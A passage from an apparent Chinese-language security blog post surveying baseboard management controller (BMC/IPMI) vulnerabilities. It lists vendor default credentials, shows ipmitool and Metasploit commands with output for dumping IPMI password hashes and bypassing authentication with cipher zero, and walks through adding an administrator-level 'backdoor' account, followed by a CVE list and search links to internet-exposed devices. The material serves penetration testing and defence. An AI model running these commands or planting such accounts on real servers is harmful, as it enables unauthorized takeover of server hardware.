<p>IPMI 能够横跨不同的操作系统、固件和硬件平台，可以智能的监视、控制和自动回报大量服务器的运行状况，以降低服务器系统成本。IPMI基于UDP协议进行传输，基于该协议建立的远程管理控制服务，默认绑定在623端口。</p>
<ul>
<li>大部分设备都存在默认账号和密码。</li>
</ul>
<table>
<thead>
<tr>
<th>设备</th>
<th>默认用户名</th>
<th>默认密码</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>HP</strong> Integrated Lights Out (iLO)</td>
<td>Administrator</td>
<td>8 位随机字符</td>
</tr>
<tr>
<td><strong>Dell</strong> Remote Access Card (iDRAC, DRAC)</td>
<td>root</td>
<td>calvin</td>
</tr>
<tr>
<td><strong>IBM</strong> Integrated Management Module (IMM)</td>
<td>USERID</td>
<td>PASSW0RD (with a zero)</td>
</tr>
<tr>
<td><strong>Fujitsu</strong> Integrated Remote Management Controller</td>
<td>admin</td>
<td>admin</td>
</tr>
<tr>
<td><strong>Supermicro</strong> IPMI (2.0)</td>
<td>ADMIN</td>
<td>ADMIN</td>
</tr>
<tr>
<td><strong>Oracle/Sun</strong> Integrated Lights Out Manager (ILOM)</td>
<td>root</td>
<td>changeme</td>
</tr>
<tr>
<td><strong>ASUS</strong> iKVM BMC</td>
<td>admin</td>
<td>admin</td>
</tr>
<tr>
<td><strong>Huawei</strong> Intelligent Baseboard Management Controller(iBMC)</td>
<td>root</td>
<td>Huawei12#$</td>
</tr>
</tbody>
</table>
<ul>
<li><p><a target="_blank" rel="noopener" href="http://fish2.com/ipmi/remote-pw-cracking.html">CVE-2013-4786</a>：IPMI 2.0 RAKP 密码哈希泄露</p>
<p>在IPMI RAKP 消息 2 回复中包含获得 HMAC，通过本地爆破可以得到密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 192.168.8.117 chassis identify</span><br><span class="line">[...]</span><br><span class="line">Key exchange auth code [sha1] : 0xede8ec3caeb235dbad1210ef985b1b19cdb40496</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>Metasploit 供了扫描模块 auxiliary/scanner/ipmi/ipmi_dumphashes。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/ipmi/ipmi_dumphashes</span><br><span class="line">msf auxiliary(ipmi_dumphashes) &gt; <span class="built_in">set</span> RHOSTS 10.0.0.0/24</span><br><span class="line">msf auxiliary(ipmi_dumphashes) &gt; <span class="built_in">set</span> THREADS 256</span><br><span class="line">msf auxiliary(ipmi_dumphashes) &gt; run</span><br><span class="line">[ ] 10.0.0.59 root:266ead5921000000....000000000000000000000000000000001404726f6f74:eaf2bd6a5 3ee18e3b2dfa36cc368ef3a4af18e8b</span><br><span class="line">[ ] 10.0.0.59 Hash <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span> matches password <span class="string">&#x27;calvin&#x27;</span></span><br><span class="line">[ ] 10.0.0.59 :408ee18714000000d9cc....000000000000000000000000000000001400:93503c1b7af26abee 34904f54f26e64d580c050e</span><br><span class="line">[ ] 10.0.0.59 Hash <span class="keyword">for</span> user <span class="string">&#x27;&#x27;</span> matches password <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><a target="_blank" rel="noopener" href="http://fish2.com/ipmi/cipherzero.html">ipmi_cipher_zero</a></p>
<p>远程攻击者可通过使用密码套件0（又名cipher zero）和任意的密码，利用该漏洞绕过身份认证，执行任意IPMI命令。IPMI 2.0使用cipher zero加密组件时，攻击者只需要知道一个有效的用户名就可以接管IPMI的功能。</p>
<p>正常状态下，使用错误的账户是不能建立会话的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ipmitool -I lanplus -H 10.0.0.99 -U Administrator -P FluffyWabbit user list</span><br><span class="line">Error: Unable to establish IPMI v2 / RMCP session</span><br><span class="line">Get User Access <span class="built_in">command</span> failed (channel 14, user 1)</span><br></pre></td></tr></table></figure>
<p>添加 <code>-C 0</code> 选项，使用 cipher 0 了绕过认证。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list</span><br><span class="line">ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit</span><br><span class="line">1  Administrator    <span class="literal">true</span>    <span class="literal">false</span>      <span class="literal">true</span>      ADMINISTRATOR</span><br><span class="line">2  (Empty User)    <span class="literal">true</span>    <span class="literal">false</span>      <span class="literal">false</span>      NO ACCESS</span><br></pre></td></tr></table></figure>
<p> 添加一个后门账户。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user <span class="built_in">set</span> name 2 backdoor</span><br><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user <span class="built_in">set</span> password 2 password</span><br><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4</span><br><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user <span class="built_in">enable</span> 2</span><br><span class="line">$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list</span><br><span class="line">ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit</span><br><span class="line">1  Administrator    <span class="literal">true</span>    <span class="literal">false</span>      <span class="literal">true</span>      ADMINISTRATOR</span><br><span class="line">2  backdoor              <span class="literal">true</span>    <span class="literal">false</span>      <span class="literal">true</span>      ADMINISTRATOR</span><br><span class="line">$ ssh backdoor@10.0.0.99</span><br><span class="line">backdoor@10.0.0.99<span class="string">&#x27;s password: password</span></span><br><span class="line"><span class="string">User:backdoor logged-in to ILOMXQ3469216(10.0.0.99)</span></span><br><span class="line"><span class="string">iLO 4 Advanced Evaluation 1.13 at  Nov 08 2012</span></span><br><span class="line"><span class="string">Server Name: host is unnamed</span></span><br><span class="line"><span class="string">Server Power: On</span></span><br><span class="line"><span class="string">&lt;/&gt;hpiLO-&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="漏洞列表（部分）"><a href="#漏洞列表（部分）" class="headerlink" title="漏洞列表（部分）"></a>漏洞列表（部分）</h3><p>BMC 存在的漏洞以 Web 后台管理的居多，IPMI、Redfish 等管理接口也有不少的问题。暴露的漏洞种类繁多，出现的漏洞类型如下,并列举了部分案例。总体来看命令注入、认证绕过、越权以及信息泄露这四种占比较大，威胁系数也属于最高。</p>
<ul>
<li><p>XSS</p>
<ul>
<li>CVE-2019-11216: 惠普 iLO5 XSS 漏洞。</li>
<li>CVE-2019-6159: IBM System x IMM XSS 漏洞。</li>
</ul>
</li>
<li><p>CSRF</p>
<ul>
<li>CVE-2020-15046: SuperMicro IPMI 03.40  可利用 CSRF 添加管理员用户。</li>
</ul>
</li>
<li><p>命令注入</p>
<ul>
<li><p>CVE-2020-21224 :  浪潮 NF5266M5  Cluster Management System 命令注入。</p>
</li>
<li><p>CVE-2019-1885: 思科 Integrated Management Controller (IMC) 由于校验不足，导致可通过 redfish 执行任意命令。</p>
</li>
<li>CVE-2019-19642: SuperMicro IPMI 基于IPMI 的虚拟媒体服务存在命令注入漏洞。</li>
<li>CVE-2018-9086: Lenovo ThinkServer-branded 服务器固件下载命令存在命令注入漏洞，允许授权用户下载任意代码执行。</li>
</ul>
</li>
<li><p>越权</p>
<ul>
<li>CVE-2018-15774：戴尔 EMC iDRAC 校验不足导致，普通用户可通过 redfish 提升至管理员权限。</li>
<li>CVE-2018-7950/CVE-2018-7951  华为 iBMC JSON 注入修改管理员密码提升至管理员权限。</li>
<li>CVE-2018-7949 : 华为 iBMC 登录功能存在缺陷，低权限用户可获得以及修改管理员密码。</li>
<li>CVE-2018-7941: 华为 iBMC 低权限用户通过上传证书提升至管理员权限。</li>
<li>CVE-2017-17323：华为 iBMC 低权限用户可访问高权限用户才能访问的页面。</li>
</ul>
</li>
<li><p>认证绕过</p>
<ul>
<li>CVE-2018-1668: IBM DataPower Gateway 允许使用 “null” 登录，能够读取 IPMI 的敏感数据。</li>
<li>CVE-2017-12542： HPE iLO5 认证绕过漏洞。</li>
<li>CVE-2013-4784: HP iLO 任意密码绕过, 利用 IPMI cipher 0。</li>
<li>CVE-2014-8272: IPMI 1.5 会话ID随机性不足。</li>
<li>CVE-2013-4782: Supermicro 身份验证绕过导致任意代码执行。</li>
<li>CVE-2013-4783: Dell iDRAC6 身份验证绕过导致任意代码执行。</li>
</ul>
</li>
<li><p>加密算法强度不足</p>
<ul>
<li>CVE-2016-6899：华为 iBMC 包含了弱加密算法，攻击者能够解密加密的数据，导致信息泄露。</li>
</ul>
</li>
<li><p>拒绝服务</p>
<ul>
<li>CVE-2016-6900： 华为 iBMC 资源消耗漏洞，造成拒绝服务漏洞。</li>
</ul>
</li>
<li><p>缓冲区溢出</p>
<ul>
<li>CVE-2021-29202: HPE iLO4/5 缓冲区溢出漏洞。</li>
<li>CVE-2013-3623: Supermicrocgi/close_window.cgi缓冲区溢出任意命令执行。</li>
<li>CVE-2013-3622: Supermicro logout.cgi缓冲区溢出任意命令执行</li>
</ul>
</li>
<li><p>信息泄露：管理员凭证、任意文件下载、API接口</p>
<ul>
<li>CVE-2020-14156: <a target="_blank" rel="noopener" href="https://github.com/openbmc/openbmc">openbmc</a> 信息泄露，任何使用 SSH、SCP 访问 MBC 的用户都能去读 <code>/etc/ipmi_pass</code>文件，解码认证凭证后能越权到其他用户。</li>
<li>CVE-2014-0860: IBM BladeCenter高级管理模块IPMI明文凭证泄漏。</li>
<li>CVE-2013-4786: IPMI2.0离线密码爆破漏洞。</li>
<li>CVE-2013-4037: IBM IPMI明文凭证泄漏。</li>
<li>CVE-2013-4037: IPMI 密码哈希值泄漏漏洞。</li>
</ul>
</li>
<li><p>硬编码：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4621">CVE-2019-4621: 特殊状态下的默认口令</a></li>
<li>CVE-2013-4031: IPMI用户默认账号登录漏洞。</li>
</ul>
</li>
<li><p>逻辑漏洞：</p>
<ul>
<li>CVE-2020-26122：浪潮 NF5266M5 服务器固件更新验证脆弱，向固件包中插入恶意代码可获取系统控制权。</li>
<li>CVE-2019-4169: IBM Open Power Firmware OP910 and OP920 密码更改后原密码不失效。</li>
<li>CVE-2019-6161: ThinkAgile CP-SB 会话可被重用。</li>
</ul>
</li>
</ul>
<h3 id="公网设备"><a href="#公网设备" class="headerlink" title="公网设备"></a>公网设备</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=title%3A&quot;TSCEV4.0&quot;">浪潮 - TSCEV4.0</a></li>
<li><a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=product%3A%22HP+iLO%22">HP-iLo - product:”HP iLO”</a></li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/161">基于IPMI协议的DDoS反射攻击分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/KevinGeorge/p/8716863.html">IPMI相关漏洞利用及WEB端默认口令登录漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e18de3800686">服务器BMC技术调研</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cie.org.cn/system/upload/file/20200710/1594365223119079.pdf">服务器基板管理控制器(BMC)带外管理功能和性能要求</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/79940641">CVE-2017-12542简单分析及复现</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/Inspur/blob/master/ClusterEngineV4.0 Vul/Readme.md">ClusterEngineV4.0 Vul </a></li>
<li><a target="_blank" rel="noopener" href="https://www.dark-sec.net/2019/12/supermicro-ipmi-exploitation.html">SuperMicro IPMI Exploitation</a></li>
<li><a target="_blank" rel="noopener" href="https://labs.f-secure.com/archive/cve-2014-8272/">CVE-2014-8272: A Case of Weak Session-ID in Dell iDRAC</a></li>
<li><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/">A Penetration Tester’s Guide to IPMI and BMCs </a></li>
<li><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/">Supermicro IPMI Firmware Vulnerabilities </a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">623/UDP/TCP - IPMI - HackTricks</a></li>
<li><a target="_blank" rel="noopener" href="http://fish2.com/ipmi/remote-pw-cracking.html">Cracking IPMI Passwords Remotely </a></li>
<li><a target="_blank" rel="noopener" href="http://fish2.com/ipmi/cipherzero.html">The Infamous Cipher Zero</a></li>
<li><a target="_blank" rel="noopener" href="https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/">CVE-2019-6260: Gaining control of BMC from the host processor</a></li>
<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/bmc-patrol-mcmnm-privesc/">CVE-2017-13130 - BMC Patrol ‘mcmnm’ - Privilege Escalation via a Vulnerable SUID Binary</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=iBMC">CVE - iBMC</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=iLO">CVE - iLO</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=inspur">CVE - inspur</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=redfish">CVE - redfish</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipmi">CVE - ipmi</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=BMC">CVE - BMC</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=IMM2">CVE - IMM2</a></li>
</ul>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">BMC 历史漏洞汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%A6%E5%A4%96%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">云服务器带外管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPMI"><span class="toc-number">1.1.1.</span> <span class="toc-text">IPMI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IPMI-%E5%91%BD%E4%BB%A4%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">IPMI 命令举例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redfish"><span class="toc-number">1.1.2.</span> <span class="toc-text">Redfish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#API-%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">API 举例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%ABPOC%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">含POC的漏洞（部分）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-21224-%E6%B5%AA%E6%BD%AE-NF5266M5-Cluster-Management-System-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">CVE-2020-21224 :  浪潮 NF5266M5  Cluster Management System 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-19642-SuperMicro-IPMI-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">CVE-2019-19642: SuperMicro IPMI 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-15046-SuperMicro-IPMI-03-40-CSRF-%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.3.</span> <span class="toc-text">CVE-2020-15046: SuperMicro IPMI 03.40 - CSRF(添加管理员用户)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-12542-HPE-ILO4-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.4.</span> <span class="toc-text">CVE-2017-12542: HPE ILO4 认证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2014-8272-Dell-iDRAC-IPMI-1-5-Session-ID-%E9%9A%8F%E6%9C%BA%E5%8C%96%E9%97%AE%E9%A2%98%E5%8F%AF%E8%A2%AB%E9%A2%84%E6%B5%8B"><span class="toc-number">1.2.5.</span> <span class="toc-text">CVE-2014-8272: Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Supermicro-IPMI-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.6.</span> <span class="toc-text">Supermicro IPMI 密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPMI-%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.7.</span> <span class="toc-text">IPMI 接口漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞列表（部分）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E8%AE%BE%E5%A4%87"><span class="toc-number">1.4.</span> <span class="toc-text">公网设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=BMC 历史漏洞汇总"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&is_video=false&description=BMC 历史漏洞汇总"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BMC 历史漏洞汇总&body=Check out this article: http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=BMC 历史漏洞汇总"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&name=BMC 历史漏洞汇总&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=BMC 历史漏洞汇总"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2023 Delikely
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({{ JSON.stringify(config) }});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="{{ src }}">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'G-KX5LMFBRGG', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


